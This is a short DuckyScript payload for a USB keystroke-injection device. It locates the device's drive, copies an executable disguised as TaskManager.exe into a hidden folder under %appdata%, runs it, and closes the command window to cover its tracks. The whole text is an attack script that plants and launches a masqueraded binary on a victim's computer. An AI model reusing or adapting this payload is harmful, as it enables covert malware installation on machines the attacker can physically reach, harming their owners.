DuckyScript source:

```
REM *** Copy TaskManager.exe from USB to %appdata%/.TaskManager/ ***
DELAY 500
STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set duck=%d
ENTER
DELAY 500
STRING xcopy /y %duck%\TaskManager.exe %appdata%\.TaskManager\TaskManager.exe
ENTER
DELAY 500

REM *** Execute TaskManager.exe ***
STRING %appdata%\.TaskManager\TaskManager.exe
ENTER
DELAY 500

REM *** GTFO ***
STRING exit
ENTER
STRING exit
ENTER
```